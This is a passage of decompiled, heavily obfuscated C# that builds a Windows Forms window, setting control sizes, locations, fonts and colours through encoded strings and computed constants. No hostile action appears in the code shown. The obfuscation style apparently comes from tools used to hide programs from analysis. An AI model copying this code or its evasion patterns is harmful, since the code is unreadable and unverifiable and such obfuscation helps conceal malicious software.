			num518 = Convert.ToInt32("37" + "77" + "7662221", 8) * (69473862 >> Convert.ToInt32("11010", 2));
			break;
		}
		int width11 = num518;
		int num519 = checked(-99295 - (_003CModule_003E.get_PositiveSign[195] | -839107616));
		string string_321 = "\u2df3ⶦ";
		object[] array315 = new object[_003CModule_003E.ActivityOptions[175] - 723764];
		int num520 = array[2];
		array315[num520] = 'ơ';
		array315[1] = string.Concat(char.ToString('כ'), char.ToString('Κ'), char.ToString('\u0087') + char.ToString('\u0096') + "6\u001c");
		array315[Convert.ToInt32("10", 2)] = _003CModule_003E.KeyValuePair__2[Convert.ToInt32("36", 16)];
		array315[Convert.ToInt32("11", 2)] = _003CModule_003E.KeyValuePair__2[55];
		array315[4] = "փє";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_321, array315);
		((Control)hString6).set_Size(new Size(width11, num519 & Convert.ToInt32(string_321, checked(Marshal.SizeOf(typeof(LocalizedLanguageName)) - 262027))));
		((Control)HString).set_TabIndex(array4[5] * 4);
		((Control)HString).set_TabStop((byte)array4[checked(705418 - Void)] != 0);
		((Control)MarvinSeed).set_BackColor(Color.Crimson);
		((Control)MarvinSeed).get_Controls().Add((Control)(object)CompressedStack);
		Panel marvinSeed = MarvinSeed;
		int num521;
		checked
		{
			num521 = ((((Convert.ToInt32("fffef5cd", 16) * unchecked((nint)((Array)(object)"\u034b").LongLength) < -927574) ? 1 : 0) != get_PositiveInfinity) ? Convert.ToInt32("37" + "77" + "4323602", Convert.ToInt32("1000", 2)) : (~array2[294]));
		}
		int x9 = 202348160 / num521;
		int num522 = _003CModule_003E.KeyValuePair__2[56];
		int num523 = ((Marshal.SizeOf(typeof(UserInteractive)) > 472538) ? 496762 : 264);
		((Control)marvinSeed).set_Location(new Point(x9, (num522 % num523) | 0x82));
		Panel marvinSeed2 = MarvinSeed;
		string text230 = char.ToString((char)((array2[_003CModule_003E.get_PositiveSign[124]] != _003CModule_003E.KeyValuePair__2[57]) ? '\udb84' : Convert.ToInt32(char.ToString('f') + char.ToString('f') + "fa297e", ((Array)(object)"\u034e\u0351\u0327\u0351\u0339\u035d\u0353\u0311\u033b\u0316\u0321\u0318\u032c\u0355\u0342\u0312").Length)));
		string text231 = char.ToString((char)Convert.ToInt32(char.ToString('1') + "101101110010101", array[1]));
		string text232 = char.ToString('\udb9a');
		string string_322 = char.ToString('㗄') + "㗍㖒";
		object[] array316 = new object[6];
		array316[0] = Convert.ToInt32("10111" + "00001110", 2);
		array316[checked(Marshal.SizeOf(typeof(Ldelem_R4)) - 96555)] = SEP_DaySuff | 0xAC16;
		array316[Convert.ToInt32("12", 8) % 4] = (byte)(83 >> Marshal.SizeOf(typeof(VT_VOID))) != 0;
		array316[3] = string.Concat(char.ToString('\u0bc3'), char.ToString('ଧ') + "ɞ3");
		array316[array[6] * 1] = 2438;
		array316[Convert.ToInt32("16444505555", 8) / 391152201] = 2064;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_322, array316);
		string string_323 = string.Concat(text230, text231 + text232 + string_322);
		object[] array317 = new object[_003CModule_003E.CalendarType[0]];
		string string_324 = "벴";
		object[] array318 = new object[Convert.ToInt32("37776215423", 8) ^ -451818];
		array318[0] = GetRaiseMethod;
		array318[1] = 17486;
		array318[2] = (char)((array2[295] < -517462) ? CompilationKeyword : '涻');
		array318[checked(Convert.ToInt32("fffbe047", 16) + 270268)] = false;
		array318[array2[5]] = CommonPrograms;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_324, array318);
		int num524 = Convert.ToInt32(string_324, 2);
		string string_325 = "枲ҵ";
		object[] array319 = new object[(76021 == Convert.ToInt32("224365", 8)) ? Convert.ToInt32("5", 16) : 948794];
		array319[0] = _003CModule_003E.KeyValuePair__2[48];
		array319[1] = ~Convert.ToInt32("fffffebe", 16);
		array319[Convert.ToInt32("2", ((Array)(object)"\u0318\u036b\u0353\u036e\u036b\u0326\u0319\u0348\u0349\u0355\u032a\u031e\u0323\u0315\u0343\u0336").Length)] = 'Ė';
		array319[397140 + Convert.ToInt32("fff9f0af", 16)] = '\u008d';
		array319[Convert.ToInt32(char.ToString('1') + "00", _003CModule_003E.ActivityOptions[0])] = DOpenNamespace;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_325, array319);
		string text233 = string_325;
		string text234 = char.ToString('ē');
		string string_326 = char.ToString((char)Convert.ToInt32("a157", 16)) + "ꕁ\ua4c7";
		int num525 = ((_003CModule_003E.get_PositiveSign[196] != -73600) ? Convert.ToInt32("4", 16) : (-5554));
		object[] array320 = new object[num525];
		array320[Convert.ToInt32("11110100011011111", 2) >> Convert.ToInt32("21", 8)] = false;
		int num526 = ((array[115] >= -138402) ? 1 : Convert.ToInt32("fff35170", 16));
		array320[num526] = Marshal.SizeOf(typeof(get_LocalDateTime)) + -405410;
		array320[1 << Convert.ToInt32("1", 8)] = 8941;
		array320[Convert.ToInt32("3", array2[97])] = Marshal.SizeOf(typeof(Round));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_326, array320);
		array317[num524] = string.Concat(text233, text234 + string_326);
		int num527 = default(int);
		switch (ConvertToUInt32 / 464 + checked(AttachedToParent - 746000))
		{
		case 0:
			num527 = 1;
			break;
		case 1:
			num527 = array2[83] - _003CModule_003E.KeyValuePair__2[flushEncoder];
			break;
		}
		array317[num527] = _003CModule_003E.LoadVector128[array2[84] ^ IsName];
		array317[(uint)array4[Marshal.SizeOf(typeof(ArrayListDebugView))]] = false;
		string string_327 = "侂";
		object[] array321 = new object[4];
		array321[(nint)((Array)(object)string.Empty).LongLength] = 18210;
		array321[1 * array2[2]] = array2[16];
		array321[2] = 'ʠ';
		array321[3] = 1467;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_327, array321);
		int num528 = Convert.ToInt32(string_327, 0 | (Convert.ToInt32("11111111111101010001101100010100", 2) - -713980));
		string string_328 = string.Concat(char.ToString('υ'), "φσ", "τπ" + "τπχχρ");
		object[] array322 = new object[3];
		array322[array2[1] * 971982] = string.Concat(char.ToString('Ƨ'), char.ToString('H'), char.ToString('\u001c') + "\0\t");
		array322[5 % Stream] = 385;
		array322[10 % (int)array[6]] = string.Concat(char.ToString('A'), char.ToString('\u0003') + char.ToString('\0') + "\u0010\u0004\0\u0004");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_328, array322);
		array317[num528] = Convert.ToInt32(string_328, _003CModule_003E.get_PositiveSign[(uint)array[5]]) / 67320;
		_003CModule_003E.GetMaxByteCount(ref string_323, array317);
		((Control)marvinSeed2).set_Name(string_323);
		Panel marvinSeed3 = MarvinSeed;
		char c98 = (char)array6[_003CModule_003E.get_PositiveSign[28]];
		int width12 = c98;
		int num529;
		if (Latin1Utility < GetUnderlyingObject)
		{
			num529 = -498032;
		}
		else
		{
			int num530 = default(int);
			switch (checked(1 * Convert.ToInt32("1", 16)))
			{
			case 0:
				num530 = -16150;
				break;
			case 1:
				num530 = -784557;
				break;
			}
			num529 = num530;
		}
		((Control)marvinSeed3).set_Size(new Size(width12, num529 + 498210));
		((Control)MarvinSeed).set_TabIndex((2 * checked(_003CModule_003E.KeyValuePair__2[205] + Convert.ToInt32("37775714556", 8))) | ((Convert.ToInt32("1110010001100111111", 2) - 467750) & 0x13));
		((Control)CompressedStack).set_AutoSize((byte)Marshal.SizeOf(typeof(IsTvOS)) != 0);
		Label compressedStack = CompressedStack;
		string text235 = char.ToString((char)(14340 % Convert.ToInt32("13150", 8)));
		string string_329 = "鴂鴈";
		object[] array323 = new object[Convert.ToInt32("11111111111100110000001111011101", 2) ^ -850981];
		array323[0] = (byte)get_PositiveInfinity != 0;
		array323[1] = "\u0abfѨ";
		array323[2] = char.ToString((char)Marshal.SizeOf(typeof(Pow))) + "Ŋÿ";
		array323[Convert.ToInt32("3", 16)] = (char)(-2066 * Convert.ToInt32("11111111111111111111111111111111", 2));
		array323[4] = Convert.ToInt32(char.ToString('c') + "fd", GCHeapDumpKeyword);
		array323[680253040 / _003CModule_003E.ActivityOptions[176]] = (int)array[ReciprocalEstimate];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_329, array323);
		string text236 = text235 + string_329;
		string string_330 = char.ToString('\u088c') + "\u0891\u088d";
		object[] array324 = new object[Convert.ToInt32("4c3b", 16) ^ 0x4C39];
		array324[0] = 99 << array2[2];
		array324[(nint)((Array)(object)"\u0300").LongLength] = 705;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_330, array324);
		string text237 = string_330;
		string text238 = char.ToString('ଖ');
		string string_331 = string.Concat(char.ToString('胨') + "胺肮", "胝胯胠能" + "肮胝胫胼胧胨");
		object[] array325 = new object[(uint)array[array2[6]]];
		array325[0] = (char)Convert.ToInt32(char.ToString('1') + "0001100000", array2[0]);
		array325[_003CModule_003E.ActivityOptions[177] - 752693] = 9961;
		array325[2] = 24750;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_331, array325);
		string string_332 = string.Concat(text236, text237 + text238 + string_331);
		int num531 = ((Convert.ToInt32("80a3", 16) >= 38542) ? 892022 : 19);
		object[] array326 = new object[25 % (5725597 >> num531)];
		array326[array6[0 * ((_003CModule_003E.ActivityOptions[178] >= 932715) ? (-112105) : (-26444))]] = checked(ICustomAttributeProvider * (57150 << array2[2] >> 15));
		int num532 = ((get_CurrentManagedThreadId - 830135 > -461364) ? (-105351) : _003CModule_003E.ActivityOptions[IsHeld]);
		string string_333 = string.Concat(char.ToString('䟏') + char.ToString('䟏') + "䟏䟏䟏䟏䟏䟏", "䟏䟏䟏䟏" + "䟏䟏䟏" + "䟎䟎䟏䟏䟎䟎䟏䟎䟎䟎䟏䟏䟏䟏䟎䟎䟎");
		object[] array327 = new object[get_ResourceExposureLevel | 6];
		array327[0] = Convert.ToInt32("191", 16) * 2;
		array327[(uint)array[3]] = -343579 - EnumeratorCancellationAttribute;
		array327[2] = (char)((Convert.ToInt32("37777711306", 8) <= array2[296]) ? array[116] : 4294692071u);
		int num533 = ((Convert.ToInt32("6423", 8) < -916054) ? (-549909) : Marshal.SizeOf(typeof(CharSetMask)));
		array327[num533] = (char)(1532066802 / Convert.ToInt32("4134333", 8));
		int num534 = get_ResourceExposureLevel;
		int num535 = Convert.ToInt32("0", 16);
		array327[num534] = (byte)num535 != 0;
		array327[Convert.ToInt32("5", dwCookie)] = 1897;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_333, array327);
		array326[checked(num532 - Convert.ToInt32(string_333, ((Array)(object)"\u0326\u033d").Length))] = (char)(-411310 - ((261822 - get_IsCanceled < -547621) ? (-197357) : (-411805)));
		array326[2] = 1083;
		int num536 = checked(506143 + (-350488 - (array2[297] - -718381)));
		string string_334 = "\ud98b";
		object[] array328 = new object[5];
		array328[0] = ((10164 == Convert.ToInt32("10011110110100", 2)) ? 48132 : 571019);
		array328[array2[2]] = _003CModule_003E.KeyValuePair__2[206] - -750698;
		array328[Convert.ToInt32("2", _003CModule_003E.KeyValuePair__2[2])] = false;
		array328[endAction] = array2[(uint)array[60]];
		array328[Convert.ToInt32("4", 16)] = checked(Marshal.SizeOf(typeof(DX_NN)) + -613660);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_334, array328);
		array326[num536] = (byte)Convert.ToInt32(string_334, array4[16]) != 0;
		int num537 = 7 & _003CModule_003E.CalendarType[0];
		int num538 = checked(Convert.ToInt32(char.ToString('4') + "477465", 8) + array2[_003CModule_003E.ActivityOptions[144]]);
		string string_335 = string.Concat(char.ToString((char)_003CModule_003E.KeyValuePair__2[207]), char.ToString('폚') + "폚폚폚", char.ToString('폚') + "폚폚폚폚폚폚폚폚폛폛폚폛폛폛폛폛폚폚폛폚폛폚폛폚폚폚");
		object[] array329 = new object[5];
		array329[0] = 14478;
		array329[array2[298] ^ 0x970FC] = 7128;
		array329[checked(array2[299] - -784008)] = (byte)checked(_003CModule_003E.ActivityOptions[1] * -311318) != 0;
		int num539 = 310737 + array2[300];
		int num540 = ((1 != Convert.ToInt32("0", 2)) ? 590 : 210046);
		array329[num539] = num540;
		array329[4] = FixedSize;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_335, array329);
		array326[num537] = (char)(num538 + Convert.ToInt32(string_335, 2));
		_003CModule_003E.GetMaxByteCount(ref string_332, array326);
		string text239 = string_332;
		int num541 = 129531 * (Convert.ToInt32("11111111111101010000111011111010", 2) ^ 0xAF106) - checked(-1354903 + (214215614 >> dwCookie));
		int num542 = _003CModule_003E.LoadVector128[checked(-226850 - (_003CModule_003E.KeyValuePair__2[208] & Convert.ToInt32("fffe99dd", 16)))];
		int num543 = (((nint)1 != (nint)((Array)(object)string.Empty).LongLength) ? (-1) : 154973);
		int num544 = ~num543;
		((Control)compressedStack).set_Font(new Font(text239, 50f, (FontStyle)num541, (GraphicsUnit)num542, (byte)num544));
		((Control)CompressedStack).set_ForeColor(SystemColors.ControlLightLight);
		Label compressedStack2 = CompressedStack;
		string text240 = char.ToString(array[11]);
		string string_336 = string.Concat(char.ToString('\udbd1'), char.ToString((char)array2[302]), char.ToString('\udb94') + "\udbe7\udb81");
		object[] array330 = new object[3];
		array330[0] = 1550;
		string text241;
		string string_337;
		object[] array331;
		checked
		{
			array330[array2[2] * 1] = Convert.ToInt32("101" + "1001100100100", 2);
			array330[2 * Convert.ToInt32("1", 16)] = "᠂ݖ";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_336, array330);
			text241 = string_336;
			string_337 = string.Concat(char.ToString('\uf01e') + "\uf076\uf014\uf032\uf067\uf00f", "\uf037\uf00e\uf01b\uf010" + "\uf02b\uf042\uf016\uf039\uf035\uf076\uf020");
			array331 = new object[3];
			array331[0] = CheckAccessOnOverride;
			array331[Convert.ToInt32("11100101110011101011", 2) ^ 0xE5CEA] = char.ToString('䀳') + char.ToString('\u1ddc') + "\u0d4a䚙";
		}
		int num545 = Convert.ToInt32("10111100010000101100", 2) - 771114;
		int num546 = ((Marshal.SizeOf(typeof(ManyElementAsyncLocalValueMap)) >= 771252) ? CheckName : 10853);
		array331[num545] = (char)num546;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_337, array331);
		((Control)compressedStack2).set_Location(new Point(((Array)(object)(text240 + text241 + string_337)).Length, SecurityCriticalAttribute));
		Label compressedStack3 = CompressedStack;
		string text242 = char.ToString((char)(ICollectionDebugView__1 + 984745));
		string text243 = char.ToString((char)(checked(-647246 * sizeof(byte)) - Convert.ToInt32(char.ToString('f') + char.ToString('f') + "f5ea85", 16)));
		string text244 = char.ToString('㔮');
		string string_338 = string.Concat(char.ToString('濾'), char.ToString('濷') + "澪澫");
		object[] array332 = new object[(Marshal.SizeOf(typeof(GetData)) > 492442) ? _003CModule_003E.KeyValuePair__2[209] : 3];
		array332[0] = 'ߐ';
		array332[(nint)((Array)(object)"\u0323").LongLength] = "䬦Н";
		array332[sizeof(ushort)] = 'τ';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_338, array332);
		string string_339 = string.Concat(text242, text243, text244 + string_338);
		int[] calendarType = _003CModule_003E.CalendarType;
		int num547 = ((7635 >= Convert.ToInt32("1011" + char.ToString('1') + "111011100100001", 2)) ? (Convert.ToInt32("ffea8441", 16) - -620887) : (5 % Convert.ToInt32("10", 2)));
		object[] array333 = new object[calendarType[num547]];
		int num548 = ((-93815 / checked(_003CModule_003E.get_PositiveSign[198] + -119451) <= Convert.ToInt32("ff" + "ffdb9a", 16) + Convert.ToInt32(char.ToString('3') + char.ToString('0') + "17252", array2[97])) ? checked(521736 - Convert.ToInt32(char.ToString('7') + "f608", Convert.ToInt32("10000", 2))) : array4[21]);
		array333[num548] = array6[13];
		int tryFromBase64String = TryFromBase64String;
		int num549 = Marshal.SizeOf(typeof(TaskExtensions));
		checked
		{
			array333[tryFromBase64String ^ (-229918 + num549)] = 5605 * Marshal.SizeOf(typeof(GetMethodBody));
		}
		int num550 = _003CModule_003E.Dequeue[Marshal.SizeOf(typeof(InvokeMayRunArbitraryCode)) - Marshal.SizeOf(typeof(InvokeMayRunArbitraryCode))] << Marshal.SizeOf(typeof(IsTvOS));
		int[] dequeue5 = _003CModule_003E.Dequeue;
		int num551 = ((Convert.ToInt32("10e09", 16) == -21482) ? Convert.ToInt32("11111111111111010011101011000101", 2) : array2[104]);
		array333[num550] = dequeue5[num551] + -775446;
		array333[Marshal.SizeOf(typeof(ArrayListDebugView))] = 163;
		int num552 = ((AssemblyTitleAttribute != -98845) ? (-5) : (-804063));
		char c99 = (char)(~num552);
		char num553 = c99;
		int[] calendarType2 = _003CModule_003E.CalendarType;
		char c100 = (char)Convert.ToInt32(char.ToString('1') + "01", 2);
		array333[(uint)num553] = calendarType2[(uint)c100];
		_003CModule_003E.GetMaxByteCount(ref string_339, array333);
		((Control)compressedStack3).set_Name(string_339);
		Label compressedStack4 = CompressedStack;
		string string_340 = "介今";
		object[] array334 = new object[Convert.ToInt32("11", _003CModule_003E.ActivityOptions[0])];
		array334[0 * VarEnum] = 332059 + _003CModule_003E.KeyValuePair__2[210];
		array334[1] = Marshal.SizeOf(typeof(Random));
		array334[2] = 12710;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_340, array334);
		string text245 = string_340;
		string string_341 = "\uf28d\uf28c";
		object[] array335 = new object[116267 >> Convert.ToInt32("17", 8)];
		array335[0] = 'ꩿ';
		array335[~HexIntPtrType] = (int)array[UpdateTimeOut];
		array335[MetadataTag ^ -570244] = ContainsKey;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_341, array335);
		string text246 = string_341;
		string string_342 = string.Concat(char.ToString('⏯'), char.ToString((char)_003CModule_003E.ActivityOptions[179]), char.ToString('⏮') + "⏯⏮");
		object[] array336 = new object[4];
		array336[0] = 2027258880 / array2[303];
		array336[1] = "ªM";
		array336[2] = Marshal.SizeOf(typeof(GetTime));
		array336[Marshal.SizeOf(typeof(CharSetMask))] = (char)_003CModule_003E.ActivityOptions[49];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_342, array336);
		((Control)compressedStack4).set_Size(new Size(Convert.ToInt32(text245 + text246 + string_342, array4[3]), 4 | MovePrevious));
		((Control)CompressedStack).set_TabIndex(checked(55102 + ~(~Convert.ToInt32("ffff28d8", 16))));
		Label compressedStack5 = CompressedStack;
		string text247 = char.ToString((char)(Convert.ToInt32(char.ToString('4') + char.ToString('8') + "18", 16) | 'ᕌ'));
		string text248 = char.ToString((char)(564810 + checked(Convert.ToInt32("11111111111011011011101010101101", 2) - -656485)));
		string text249 = char.ToString('嵖');
		string text250 = char.ToString('嵜');
		string string_343 = char.ToString('\udd6b') + char.ToString('\udd61') + "\udd6b\udd6b";
		char c101 = (char)array2[0];
		object[] array337 = new object[(uint)c101];
		array337[0] = (char)(421712141 >> Convert.ToInt32("1110", 2));
		array337[1] = 7084;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_343, array337);
		string string_344 = string.Concat(text247, text248, text249 + text250 + string_343);
		object[] array338 = new object[array6[(int)array[Marshal.SizeOf(typeof(FractionalDigitsCount))] % Marshal.SizeOf(typeof(IsValidText))]];
		char num554 = array4[0 % (591018987 / array2[304])];
		char c102 = (char)Convert.ToInt32(char.ToString('1') + char.ToString('3') + "460", 8);
		string text251 = char.ToString(c102);
		string text252 = char.ToString((char)checked(3261 + array2[305]));
		string string_345 = "ዲᮅ";
		object[] array339 = new object[Convert.ToInt32("1100100011101101110001000011110", 2) / 280918789];
		array339[0] = string.Concat("সŹ", char.ToString('\u0001') + char.ToString('\f') + "\u0001\u0013");
		array339[1] = Convert.ToInt32("262c2092", 16) / Marshal.SizeOf(typeof(get_LocalCount));
		array339[2] = 3;
		array339[3] = 131;
		array339[4] = (byte)array[Convert.ToInt32("2", 8)] != 0;
		array339[5] = string.Concat(char.ToString('l'), char.ToString((char)remove_EventCommandExecuted), char.ToString('\u000f') + "\u000f\a\u001c");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_345, array339);
		array338[(uint)num554] = string.Concat(text251, text252 + string_345);
		array338[5 % checked((-592750 + array2[306]) * -1)] = false;
		int num555;
		string string_346;
		object[] array340;
		checked
		{
			num555 = (_003CModule_003E.ActivityOptions[2] << 1) * unchecked((-585255 + Convert.ToInt32("2167054", 8)) % 2);
			string_346 = "䷀垹";
			array340 = new object[3];
			array340[0] = 'ᪧ';
			array340[1] = false;
		}
		array340[Convert.ToInt32("2", 8)] = (char)('\u1a1a' | array[117]);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_346, array340);
		string text253 = string_346;
		string text254 = char.ToString((char)Convert.ToInt32(char.ToString('b') + "3e", Convert.ToInt32("10000", 2)));
		string text255 = char.ToString((char)_003CModule_003E.get_PositiveSign[51]);
		string string_347 = char.ToString('婉') + "婠嫈";
		object[] array341 = new object[Convert.ToInt32("4", 8)];
		array341[0] = false;
		array341[1] = char.ToString('Ժ') + char.ToString((char)_003CModule_003E.ActivityOptions[115]) + ".ð";
		array341[Convert.ToInt32("2", _003CModule_003E.KeyValuePair__2[2])] = 11373;
		char c103 = (char)Convert.ToInt32("3", 16);
		array341[(int)c103] = char.ToString('ഗ') + char.ToString('ҋ') + "\u0612\u0fb6";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_347, array341);
		array338[num555] = string.Concat(text253, text254 + text255 + string_347);
		_003CModule_003E.GetMaxByteCount(ref string_344, array338);
		((Control)compressedStack5).set_Text(string_344);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		int num556;
		string string_348;
		object[] array342;
		checked
		{
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)(0x426BE ^ (-642049 + (array2[307] << unchecked((int)((Array)(object)"\u0355\u0342\u0306\u0306").LongLength)))));
			num556 = _003CModule_003E.LoadVector128[array2[10]];
			string_348 = string.Concat(char.ToString('\udee1') + char.ToString('\udee1') + "\udee1\udee1", char.ToString('\udee1') + "\udee1\udee1\udee1\udee1\udee1\udee1\udee1\udee0\udee0\udee1\udee0\udee1\udee1\udee1\udee1\udee1\udee1\udee0\udee1\udee0\udee1\udee0\udee0\udee0\udee0\udee1\udee1");
			int num557 = Convert.ToInt32("3", 8);
			array342 = new object[num557];
		}
		array342[0] = string.Concat(char.ToString('\u0a7f'), char.ToString((char)Convert.ToInt32("be1", 16)), char.ToString('ǽ') + "୪У");
		array342[Convert.ToInt32("1", GCHeapDumpKeyword)] = 32779;
		array342[2] = string.Concat(char.ToString('⛰'), char.ToString('Ȯ') + "ՃѾϼ");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_348, array342);
		((Control)this).set_BackColor(Color.FromArgb(num556 - Convert.ToInt32(string_348, 4 >> (int)array[3]), (Convert.ToInt32(char.ToString('1') + char.ToString('0') + "010101", 2) >> 2) | _003CModule_003E.LoadVector128[29], Marshal.SizeOf(typeof(OnValueChanged)) & checked(-59 * (-1 * array2[2]))));
		int num558 = 937812 + 375973 * Convert.ToInt32("ffffffff", 16);
		string string_349 = string.Concat(char.ToString('劀'), char.ToString('劄'), char.ToString('劄') + "劄劆劅劄劃劂劅劂");
		object[] array343 = new object[5];
		array343[(uint)array[2]] = char.ToString('ʱ') + char.ToString('Â') + "Ą»";
		array343[Convert.ToInt32("1", 8)] = _003CModule_003E.get_PositiveSign[199] << 1;
		array343[829170 + Convert.ToInt32("fff35910", 16)] = (byte)Convert.ToInt32("0", sizeof(char)) != 0;
		array343[3] = (char)(118 * get_CurrentReadCount);
		array343[Marshal.SizeOf(typeof(IsValidText))] = Convert.ToInt32("100" + char.ToString('1') + "0010100101", Convert.ToInt32("2", 8));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_349, array343);
		checked
		{
			int width13 = num558 + Convert.ToInt32(string_349, 8);
			int num559 = array2[308] - 444914;
			int num560 = Convert.ToInt32(char.ToString('6') + char.ToString('a') + "cf", Convert.ToInt32("10000", 2));
			int height;
			if (num559 > num560)
			{
				height = -494004;
			}
			else
			{
				int num561 = (((Convert.ToInt32("1252511", 8) ^ -355691) > -419145) ? array2[GetConstructorToken] : (-220238));
				height = num561;
			}
			((Form)this).set_ClientSize(new Size(width13, height));
		}
		((Form)this).set_ControlBox((byte)checked(-516572 + (258286 << unchecked(616536101 / _003CModule_003E.ActivityOptions[180]))) != 0);
		((Control)this).get_Controls().Add((Control)(object)MarvinSeed);
		((Control)this).get_Controls().Add((Control)(object)HString);
		((Control)this).get_Controls().Add((Control)(object)ToVector128Unsafe);
		((Control)this).get_Controls().Add((Control)(object)Ldloc);
		((Control)this).get_Controls().Add((Control)(object)get_Modules);
		((Control)this).get_Controls().Add((Control)(object)Next);
		((Control)this).get_Controls().Add((Control)(object)get_CanRead);
		((Control)this).get_Controls().Add((Control)(object)OverwriteExisting);
		((Control)this).get_Controls().Add((Control)(object)AmbiguousMatchException);
		((Control)this).get_Controls().Add((Control)(object)M21);
		((Control)this).get_Controls().Add((Control)(object)R_OK);
		((Control)this).get_Controls().Add((Control)(object)set_PercentPositivePattern);
		((Control)this).get_Controls().Add((Control)(object)AllowHexSpecifier);
		((Control)this).get_Controls().Add((Control)(object)SetSize);
		((Control)this).get_Controls().Add((Control)(object)get_DaylightDelta);
		((Control)this).get_Controls().Add((Control)(object)panel_0);
		((Control)this).get_Controls().Add((Control)(object)IsTvOSVersionAtLeast);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)(ActualValue >> (2 & (Convert.ToInt32("101011011000011011001111", 2) >> 22))));
		string text256 = char.ToString('싃');
		string text257 = char.ToString((char)TraceOperationBegin);
		string text258 = char.ToString((char)Convert.ToInt32(char.ToString('c') + char.ToString('2') + "f7", _003CModule_003E.KeyValuePair__2[2]));
		string string_350 = "❨✴";
		object[] array344 = new object[-58484 - Convert.ToInt32("ffff1b87", 16)];
		array344[0] = string.Concat(char.ToString('M'), char.ToString((char)array2[309]), char.ToString('\u0003') + "\u0015Ö");
		array344[1] = 153;
		array344[2] = (char)Marshal.SizeOf(typeof(MdSigCallingConvention));
		array344[3] = (char)Convert.ToInt32("6443", 8);
		array344[sizeof(float)] = (char)Convert.ToInt32(char.ToString('1') + "52361", 8);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_350, array344);
		string string_351 = string.Concat(text256, text257, text258 + string_350);
		string string_352 = "祢";
		object[] array345 = new object[2 << array2[2]];
		array345[(uint)array[2]] = Convert.ToInt32(char.ToString('c') + "48", 16);
		array345[get_CurrencyGroupSeparator] = (int)array[52];
		array345[2] = 11705;
		array345[Convert.ToInt32("11", 2)] = 8506;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_352, array345);
		object[] array346 = new object[array6[Convert.ToInt32(string_352, 16)]];
		int num562 = ((-87931 > array2[88]) ? 530590 : 0);
		array346[num562 / -146] = checked(17953 * Convert.ToInt32("11111111111111111111111111110111", 2) - (Convert.ToInt32("cfba2050", 16) | -222297646) - unchecked(1120120 - _003CModule_003E.get_PositiveSign[66]));
		int num563 = IsTypeDef + Convert.ToInt32(char.ToString('d') + "295e", array[55]);
		string string_353 = "挍";
		object[] array347 = new object[_003CModule_003E.get_PositiveSign[0]];
		array347[0] = 23249;
		array347[(nint)((Array)(object)"\u0339").LongLength] = Convert.ToInt32("10" + "01" + "00010", 2);
		array347[2] = 'Ȋ';
		array347[3] = string.Concat(char.ToString('\u00a0'), char.ToString('\u0004') + "\b\u0002\n");
		array347[Convert.ToInt32("0", 8) | 4] = (byte)(_003CModule_003E.KeyValuePair__2[211] >> Marshal.SizeOf(typeof(LoadedAssembly))) != 0;
		array347[(nint)((Array)(object)(char.ToString('\u032b') + char.ToString('\u032c') + "\u034d\u0329\u0347")).LongLength] = 369;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_353, array347);
		array346[num563 & (nint)((Array)(object)string_353).LongLength] = (char)('㿝' & _003CModule_003E.ActivityOptions[50] & Marshal.SizeOf(typeof(set_Position)));
		int num564 = Convert.ToInt32("11111111111111011001100101010011", 2);
		char num565;
		int num566;
		int num567 = default(int);
		checked
		{
			num565 = array4[157360 + num564];
			num566 = ((unchecked((int)array[118]) * 1 == 1201) ? (-328399) : array2[Marshal.SizeOf(typeof(set_PermissionState))]);
			switch (_003CModule_003E.ActivityOptions[2] * 1)
			{
			case 0:
				num567 = Convert.ToInt32("11111111111111110100101011101111", 2);
				break;
			case 1:
				num567 = 34;
				break;
			}
		}
		array346[(uint)num565] = num566 % array6[num567];
		string text259 = char.ToString('\u0338');
		string string_354 = "療療";
		object[] array348 = new object[IsContextful + -907757];
		array348[0] = '퍱';
		array348[1] = (char)checked(623 * sizeof(bool));
		array348[array2[0]] = (int)array[53];
		array348[3] = (char)(Marshal.SizeOf(typeof(System_002EReflection_002EMetadata)) & '\u1cf7');
		_003CModule_003E.TAIWANLUNISOLAR(ref string_354, array348);
		IntPtr intPtr7 = (nint)((Array)(object)(text259 + string_354)).LongLength;
		string text260 = char.ToString((char)_003CModule_003E.Dequeue[19]);
		string string_355 = "잶쇩";
		object[] array349 = new object[6];
		array349[(uint)array[2]] = 'ꢏ';
		array349[1] = string.Concat(char.ToString('ϟ'), char.ToString('\u02c2'), char.ToString('\u0011') + "\u000eU");
		array349[checked(-2 * Convert.ToInt32("37777777777", 8))] = 392;
		array349[3] = 4626;
		array349[_003CModule_003E.KeyValuePair__2[212] / 178340835] = (byte)(Convert.ToInt32("0", 8) / _003CModule_003E.ActivityOptions[181]) != 0;
		array349[array2[6]] = (char)(_003CModule_003E.ActivityOptions[182] & Convert.ToInt32("1000000110", 2));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_355, array349);
		array346[(nint)intPtr7] = text260 + string_355;
		string string_356 = "\ud96b";
		int num568 = ((Convert.ToInt32("ffff35bf", 16) >= -523585) ? 2 : (-866485));
		object[] array350 = new object[num568];
